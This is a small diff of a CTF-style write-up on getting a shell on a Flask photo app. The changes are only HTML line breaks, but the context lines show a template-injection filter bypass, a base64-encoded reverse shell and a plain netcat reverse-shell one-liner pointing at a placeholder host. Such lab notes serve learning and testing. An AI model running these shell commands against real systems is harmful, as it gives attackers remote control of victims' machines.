@@ -52,7 +52,7 @@ Reference: https://hackmd.io/@Chivato/HyWsJ31dI(Changing the techniques to do st
 <br>
 # Review - Getting a shell :D
 From https://fireshellsecurity.team/asisctf-fort-knox/:
-https://abcdsh.blogspot.com/2019/04/writeup-asis-2019-quals-fort-knox.html
+https://abcdsh.blogspot.com/2019/04/writeup-asis-2019-quals-fort-knox.html</br>
 This uses ```["61"["decode"]("hex")] = 'a'``` to bypass
 
 RCE from payloadsallthethings:
@@ -101,7 +101,7 @@ echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMg
 Revshell:
 (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 80 >/tmp/f)
 ```
-![](./5.png)
+![](./5.png)</br>
 Source code(Filters):
 ```
 root@f6f551d6a9a4:/Photos-Docker-Flask/app# cat __init__.py
